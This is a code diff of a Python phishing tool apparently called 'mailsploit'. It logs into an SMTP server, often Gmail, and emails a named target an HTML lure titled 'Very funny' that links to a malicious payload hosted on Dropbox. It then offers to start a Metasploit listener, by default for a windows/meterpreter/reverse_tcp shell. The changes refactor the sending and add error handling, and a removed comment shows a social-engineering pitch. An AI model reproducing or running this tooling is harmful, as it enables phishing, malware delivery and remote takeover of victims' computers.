@@ -1,3 +1,4 @@
+#!/usr/bin/python
 #############################################################
 #
 # Title: mailsploit
@@ -55,6 +56,10 @@ def setup ():
 	global subject
 	global payload
 	global debuglevel
+	global message
+	global emaillist
+	global massmailer
+	global message
 
 	configParser = ConfigParser.RawConfigParser()	
 	configParser.read('config')
@@ -65,14 +70,19 @@ def setup ():
 	subject = configParser.get('Config', 'subject')
 	payload = configParser.get('Config', 'payload')
 	debuglevel = configParser.get('Config', 'debuglevel')
+	message = configParser.get('Config', 'message')
 
 	# Validate the input.
-	if email == 'None' or password == 'None' or target == 'None' or targetName == 'None':
+	if (email == 'None' and password == 'None' and target == 'None' and targetName == 'None'):
 		color_print('[!] Please setup your config file.', color='red')	
 		return
 
-	# Connects to the server.
-	connect()
+	if len(message) >= 10:
+		
+		# Connects to the server.
+		connect()
+	else:
+		color_print("[!] You must have a message length >= 10", color='red')
 
 #
 # Connects to the smtp server.
@@ -81,7 +91,7 @@ def connect():
 
 	# get the smtp server via user input.
 	color_print("[ Press enter twice to send via gmail ]", color='blue')
-	server = raw_input('What is the smtp server you want to connect to ex(smtp.gmail.com): ')
+	server = raw_input('What is the smtp server you want to connect to (eg smtp.gmail.com): ')
 	if server == '':
 		server = 'smtp.gmail.com'
 	try:
@@ -96,14 +106,18 @@ def connect():
 	# attempt to connect to the stmp server.
 	try:
 		# Connected to server.
-		color_print("\n[+] Connecting to smtp server..", color='blue')
+		color_print("\n[+] Connecting to " + server, color='blue')
+		try:
+			smtp = smtplib.SMTP()
+			smtp.connect(host=server, port=port)
+			smtp.ehlo()
+			smtp.starttls()
+			smtp.ehlo()
+			color_print("[+] Connected.", color='green')
 
-		smtp = smtplib.SMTP()
-		smtp.connect(host=server, port=port)
-		smtp.ehlo()
-		smtp.starttls()
-		smtp.ehlo()
-		color_print("[+] Connected.", color='green')
+		except smtplib.SMTPServerDisconnected:
+			color_print("[!] Connection unexpectedly closed, \n[!] you might be behind a firewall! Try using a VPN.", color='red')
+			return
 
 	except socket.gaierror:
 		# Failed to connect!!.
@@ -114,28 +128,25 @@ def connect():
 		# login and send the payload.
 		smtp.debuglevel = debuglevel
 		smtp.login(email, password)
-		color_print("\n Logged in.", color='green')
+		color_print("\n Authentication Successfull!.", color='green')
 
-		# Build the email.
-		buildEmail(smtp)
+		# Send the email.
+		sendMail(smtp)
 
 
 	except smtplib.SMTPAuthenticationError:
 		color_print("\nFaild to login try turning on lesssecureapps from 'https://myaccount.google.com/lesssecureapps'", color='red')
-		return
+		return	
 
 
+def sendMail (server):
 
-#
-# Builds the email.
-#
-def buildEmail (server):
-
-
-	# Encrypt the payload
 	raw_input("[ Upload it to drop box and press enter ]")
 	link = raw_input("Paste the link to your file: ")		
 	while len(link) == 0: link = raw_input("Paste the link to your file: ")
+
+
+	color_print("[+] Sending email to " + email, color='blue')
 
 	msg = MIMEMultipart('alternative')	
 	msg['From'] = email
@@ -143,57 +154,53 @@ def buildEmail (server):
 	msg['Date'] = formatdate(localtime = True)
 	msg['Subject'] = subject
 
-	#Example: 
-	#Convince the person. 
-	#I think I know you from school, This is so funny check this out, you will laugh so hard.
-	message = raw_input("Message: ")
-	while len(message) == 0: message = raw_input("Message: ")
+	# Define the html message.
 	text = """
-<html>
-<title>
-Very funny
-</title>
-<p>
-Hi """ + targetName + """,
-<br></br>
-""" + message + """
-</p>
-<a href=""" + link +""">""" + link + """</a>
-<br>
-</br>
-</html>
-"""
+		<html>
+		<title>
+		Very funny
+		</title>
+		<p>
+		Hi """ + targetName + """,
+		<br></br>
+		""" + message + """
+		</p>
+		<a href=""" + link +""">""" + link + """</a>
+		<br>
+		</br>
+		</html>
+		"""
 	html = MIMEText(text, 'html')
 	msg.attach(html)
-	
+			
 	if os.path.isfile(payload):
 
 		# Attach the file.
 		#fileMsg = MIMEBase('application','octet-stream')
-	 	#fileMsg.set_payload(file(payload_new).read())
+		#fileMsg.set_payload(file(payload_new).read())
 		#encoders.encode_base64(fileMsg)
-	 	#fileMsg.add_header('Content-Disposition','attachment;filename= %s' % filename)
-	  	#msg.attach(fileMsg)
+		#fileMsg.add_header('Content-Disposition','attachment;filename= %s' % filename)
+		#msg.attach(fileMsg)
 
 		# Send the payload
 		#color_print("[*] Sending malicious payload..", color='yellow')
 		server.sendmail(email, target, msg.as_string())
-		server.quit()
-		color_print("\n[*] Email sent", color='green')
 
-		# Do you want to listen for any connections.
+				# Do you want to listen for any connections.
 		listen = raw_input('Do you want to start up a listener: [Y/N]: ')
 		if listen == 'Y' or listen == 'y' or listen == 'yes' or listen == 'Yes':	
 			color_print("[+] Starting a listener", color='blue')
 
+			server.quit()
 			# Listen for a connection
 			listenForConnections()
 		else:
+			server.quit()
 			color_print("Thanks, Happy hacking", color='blue')
 			return	
+		color_print("\n[*] Email sent", color='green')
 	else:
 		color_print("[!] Please put your payload in " + payload + " For it to work!!", color='red')	
-	
 
 #
 # Listen for a connection
@@ -201,7 +208,7 @@ Hi """ + targetName + """,
 def listenForConnections ():
 	lhost = raw_input('What is your LHOST (local ip address): ')
 	lport = raw_input('What is your LPORT (port): ')
-	payload = raw_input('What is your payload: (ex windows/meterpreter/reverse_tcp): ')
+	payload = raw_input('What is your payload: (eg windows/meterpreter/reverse_tcp): ')
 	if payload == '':
 		payload = 'windows/meterpreter/reverse_tcp'
 
